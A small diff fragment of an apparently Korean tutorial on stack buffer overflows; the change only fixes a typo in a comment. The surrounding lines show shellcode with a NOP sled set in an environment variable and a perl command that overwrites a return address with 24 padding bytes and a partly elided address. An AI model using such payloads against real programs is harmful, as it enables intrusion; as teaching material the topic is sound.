@@ -44,7 +44,7 @@ export SHELLCODE=`perl -e 'print "\x90" x 2000, "\x31\xc0\x48\xbb\xd1\x9d\x96\x9
 
 다음과 같은 명령이 사용된다. 
 
-./overflow `perl -e 'print "X" x 24, "\x88\xeb\x.."'` // 위어에 얻어낸 주소를 리틀엔디언 방식으로 표현
+./overflow `perl -e 'print "X" x 24, "\x88\xeb\x.."'` // 위에서 얻어낸 주소를 리틀엔디언 방식으로 표현
 
 X가 24번 반복되는 부분은 리턴주소까지의 24바이트를 덮어쓰기 위함이다.
 
